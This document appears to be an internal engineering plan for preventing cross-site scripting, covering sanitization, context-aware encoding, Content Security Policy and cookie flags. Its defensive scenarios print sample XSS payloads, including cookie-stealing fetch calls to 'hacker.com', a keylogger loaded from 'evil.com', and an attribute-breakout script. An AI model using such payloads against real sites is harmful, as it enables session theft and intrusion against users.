# Comprehensive XSS Prevention Plan & Real-World Use Cases

This document outlines the required functionalities and architectural strategies to prevent Cross-Site Scripting (XSS) vulnerabilities and protect session information across our applications.

---

## 1. Input Sanitization and Validation
All user-supplied data must be treated as untrusted. Validation ensures data is in the correct format, while sanitization removes malicious payloads from legitimately formatted data (like rich text).

### Required Functionalities:
- **Centralized Sanitization Utility**: Implement a shared utility (e.g., in `@vialiq/utilities`) using `DOMPurify` (for browser) or `sanitize-html` (for Node.js backends).
- **Rich Text Handling**: Any input that requires HTML (e.g., WYSIWYG editors) must be stripped of dangerous tags (`<script>`, `<iframe>`, `<object>`) and malicious attributes (`onerror`, `onload`, `javascript:` URIs).
- **Strict Type Validation**: Non-HTML inputs must be strictly validated against expected schemas (e.g., Zod, Joi). Reject input that contains unexpected HTML characters entirely.
- **Backend Enforcement**: Sanitization MUST occur on the server-side before persisting data to the database to prevent Stored XSS. Frontend sanitization is purely for UX and immediate safety, not a replacement for backend checks.

### 📖 Real-World Scenario: Rich Text Comment System (Stored XSS)
* **The Threat**: A malicious user leaves a review or comment using a WYSIWYG editor. Instead of normal text, they intercept the API request and send: `<img src="x" onerror="fetch('https://hacker.com/steal?cookie='+document.cookie)">`.
* **The Impact**: Whenever another user (or an admin) views that comment, their browser attempts to load the invalid image "x", fails, and executes the `onerror` JavaScript, silently stealing their session cookie.
* **The Mitigation**: Before the backend saves the comment, it runs the payload through `DOMPurify`. The library recognizes `onerror` as a dangerous attribute and strips it, saving only `<img src="x">`.

---

## 2. Context-Aware Output Encoding
When displaying user-supplied data in the browser, it must be encoded according to *where* it is placed in the DOM. The browser needs to know whether to treat the data as text, an attribute, or executable code.

### Required Functionalities:
- **HTML Body Encoding**: Convert `<`, `>`, `&`, `"`, `'` to their respective HTML entities (`&lt;`, `&gt;`, etc.) when inserting data into standard HTML elements. (Modern frameworks like Angular/React handle this natively for standard bindings).
- **Attribute Encoding**: Prevent escaping out of HTML attributes. Use utilities like `escapeHtmlAttr` before interpolating variables into attributes (e.g., `<input value="${encodedValue}">`).
- **URL Scheme Validation**: When binding user data to `href` or `src` attributes, ensure the URL scheme is strictly `http://` or `https://` to prevent `javascript:` or `data:` URI execution.
- **Safe HTML Rendering**: When bypassing framework defaults (e.g., using `[innerHTML]`, `dangerouslySetInnerHTML`, or constructing `unsafeHtmlContent`), ensure the data has passed through a sanitizer immediately prior to rendering.

### 📖 Real-World Scenario: Form Builder Dynamic Placeholders (Attribute XSS)
* **The Threat**: A user configures a custom input field in a form builder and sets the placeholder to: `"> <script>alert('Hacked!')</script>`.
* **The Impact**: If the form renderer simply does `<input placeholder="${placeholder}">`, the resulting HTML becomes `<input placeholder=""> <script>alert('Hacked!')</script>">`. The attacker has successfully broken out of the `placeholder` attribute and injected a live script tag into the form canvas.
* **The Mitigation**: By running the placeholder through an attribute encoder (`escapeHtmlAttr`), the `"` is converted to `&quot;`. The resulting HTML safely becomes `<input placeholder="&quot;&gt; &lt;script&gt;alert('Hacked!')&lt;/script&gt;">`, rendering exactly as the user typed it without executing.

### 📖 Real-World Scenario: Server-Side Rendering (SSR) State Injection (JS Context XSS)
* **The Threat**: In SSR apps, initial application state is often embedded in the HTML: `<script>window.__STATE__ = ${JSON.stringify(userData)}</script>`. If a user's name is `</script><script>alert(1)</script>`, the JSON stringification will output it literally.
* **The Impact**: The browser sees `</script>` and immediately terminates the first script block, then executes the attacker's script block.
* **The Mitigation**: Context-aware encoding for JavaScript means replacing `<` with its unicode equivalent `\u003c` during JSON serialization, preventing the browser from interpreting it as an HTML tag closing sequence.

---

## 3. Defense-in-Depth: Secure HTTP Headers
Headers provide a safety net at the browser level. If an XSS vulnerability slips through your sanitization and encoding defenses, secure headers can neutralize the attack.

### Required Functionalities:
- **Content Security Policy (CSP)**: Implement a strict CSP header to restrict where the browser can load and execute scripts from.
  - Ban inline scripts by removing `'unsafe-inline'`. (This prevents `<script>alert(1)</script>` from running).
  - Ban `eval()` by removing `'unsafe-eval'`.
  - Restrict script origins to your own domain and trusted CDNs.
- **Other Security Headers**: 
  - `X-Content-Type-Options: nosniff` (Prevents the browser from trying to guess a file's MIME type, stopping attacks where a malicious script is uploaded disguised as an image).

### 📖 Real-World Scenario: Third-Party Supply Chain Attack
* **The Threat**: A popular open-source NPM package used for markdown parsing is discovered to have a zero-day XSS vulnerability. The attacker exploits this to inject a script that tries to load a keylogger from `https://evil.com/keylogger.js`.
* **The Impact**: Without a CSP, the browser dutifully fetches and runs the keylogger, compromising all users interacting with markdown content.
* **The Mitigation**: Because the application has a strict CSP (`script-src 'self' https://trusted-cdn.com`), the browser blocks the request to `evil.com`, logging a CSP violation error to the console and entirely neutralizing the attack.

---

## 4. Session Protection (Impact Mitigation)
Even with perfect XSS prevention, defense-in-depth requires assuming a breach might occur. If an attacker manages to execute JavaScript, they will immediately try to steal session identifiers.

### Required Functionalities:
- **HttpOnly Cookies**: All session-related cookies (e.g., JWTs, session IDs) MUST have the `HttpOnly` flag set. This makes the cookie completely invisible to client-side JavaScript (`document.cookie` will not show it).
- **Secure Cookies**: All cookies MUST have the `Secure` flag set so they are only transmitted over encrypted HTTPS connections, preventing man-in-the-middle sniffing.
- **SameSite Attribute**: Use `SameSite=Strict` or `SameSite=Lax` to protect against Cross-Site Request Forgery (CSRF).

### 📖 Real-World Scenario: The Unstealable Session
* **The Threat**: An attacker finds a highly obscure Reflected XSS vulnerability in a legacy search parameter and crafts a malicious link: `https://app.com/search?q=<script>fetch('http://hacker.com/?c='+document.cookie)</script>`. They trick an admin into clicking the link.
* **The Impact**: The script executes in the admin's browser. However, because the authentication token was stored in an `HttpOnly` cookie, `document.cookie` returns an empty string or only non-sensitive analytics cookies. The attacker receives nothing of value, and the admin's session remains secure.

---

## 5. Implementation Strategy in Nx Workspace
1. **Centralized Security Module**: Establish `libs/utilities/src/lib/security` as the single source of truth for sanitization and encoding utilities (e.g., our `escapeHtmlAttr`).
2. **Framework Alignment**: Audit all usages of raw DOM manipulation (like `element.innerHTML = ...`) or framework bypasses (like Angular's `DomSanitizer.bypassSecurityTrustHtml`). Mandate that data must be routed through the centralized security module first.
3. **CI/CD Integration**: 
   - Integrate SAST (Static Application Security Testing) tools into the PR pipeline to flag unsafe DOM assignments.
   - Run dependency scanners (`npm audit`, Snyk, Dependabot) to automatically catch vulnerable third-party packages.
